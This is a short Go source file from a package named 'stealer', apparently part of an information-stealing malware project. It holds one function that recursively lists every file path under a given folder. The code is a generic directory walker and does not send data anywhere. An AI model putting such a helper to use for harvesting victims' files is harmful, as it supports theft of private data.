package stealer

import (
	"io/ioutil"
	"log"
	"path"
)

//getting all files recursively in the given folder
func getFiles(directory string) []string {
	var allFilesPath []string
	files, err := ioutil.ReadDir(directory)
	if err != nil {
		log.Fatal(err)
	}

	for _, file := range files {
		if file.IsDir() {
			allFilesResult := getFiles(path.Join(directory, file.Name()))
			allFilesPath = append(allFilesPath, allFilesResult...)
		} else {
			filePath := path.Join(directory, file.Name())
			allFilesPath = append(allFilesPath, filePath)
		}
	}

	return allFilesPath
}
